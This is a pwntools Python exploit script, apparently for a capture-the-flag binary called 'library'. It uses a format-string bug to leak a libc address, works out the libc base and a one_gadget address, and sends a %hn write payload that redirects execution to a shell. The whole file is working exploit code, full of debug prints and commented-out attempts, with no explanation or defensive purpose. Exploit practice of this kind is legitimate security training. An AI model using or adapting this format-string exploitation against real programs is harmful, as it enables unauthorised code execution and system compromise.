
from pwn import *
import sys


binary_path = './library'


libc = ELF('./libc.so.6')

elf = ELF(binary_path)
io = elf.process()

io.sendlineafter('What is your name?\n', '%27$p')
io.recvuntil('Why hello there ')
get = io.recvline()
print("LEAKED OUTPUT " , get)
leak = int(get, 16)
#received = io.recv().strip()
#leak = int.from_bytes(received, "little")
#libc.address = leak - libc.sym['__libc_start_main']
libc.address = leak -  0x270b3
#libc.address = libc_base  libc.symbols['__libc_start_main']  + 0x270b3 - 0xd0b3


log.info('leak: {}'.format(hex(leak)))
log.info('libc base: {}'.format(hex(libc.address)))

one_gadget = libc.address + 0xe6c7e
puts_got = elf.got['puts']

puts_got = hex(puts_got)
one_gadget = hex(one_gadget)

print(type(puts_got))
print(type(one_gadget))

puts_got = int(puts_got,16)
one_gadget = int(one_gadget,16)

print(type(puts_got))
print(type(one_gadget))


print("one gadget : " ,hex(one_gadget))
#print('puts@got: {}'.format(hex(puts_got)))
#leak = int(data[-48:-34], 16)
rbp = leak + 0x1c63ed

print('rbp : ' + hex(rbp))

num1 = int(hex(one_gadget)[2:6], 16)
num2 = int(hex(one_gadget)[6:10], 16)
num3 = int(hex(one_gadget)[10:14], 16)

get2 = num2 
print("num2 before adding : ",get2 )

#num2 = num2 + 0x10000
#num3 = num3 + 0x10000

# var1 = int(hex(one_gadget)[2:4],16)
# var2 = int(hex(one_gadget)[4:6],16)
# var3 = int(hex(one_gadget)[6:8],16)
# var4 = int(hex(one_gadget)[8:10],16)
# var5 = int(hex(one_gadget)[10:12],16)
# var6 = int(hex(one_gadget)[12:14],16)

print(hex(one_gadget)[2:6])
print(hex(one_gadget)[6:10])
print(hex(one_gadget)[10:14])
#print(hex(one_gadget)[8:10])
#print(hex(one_gadget)[10:12])
#print(hex(one_gadget)[12:14])

print("num 1 : ", num1)
print("num 2 : ", num2)
print("num 3 : ", num3)


print("num1 :", hex(num1))
print("num2-num1 :", hex(num2-num1))
print("num3-num2:", hex(num3-(num2+num1)))

print("ADDRESS WRITTEN : ",str(hex(num1)+hex(num2-num1)+hex(num3-num2-num1)))


payload = '%{}p%22$hn%{}p%23$hn%{}p%24$hn'.format(num1, num2-num1, num3-num2).ljust(40, 'A')  
payload = bytes(payload,'utf-8')
    #payload = int(payload,16)
    #payload = p64(payload)
payload +=  p64(rbp +12) + p64(rbp+10) + p64(rbp+8)


#auto = fmtstr_payload(16, {puts_got: one_gadget}, write_size='short')

#print(auto)
#print('payload: ', payload)
gdb.attach(io,"b*0x0000000000400819")


io.sendlineafter('And what book would you like to check out?', payload)

io.interactive()
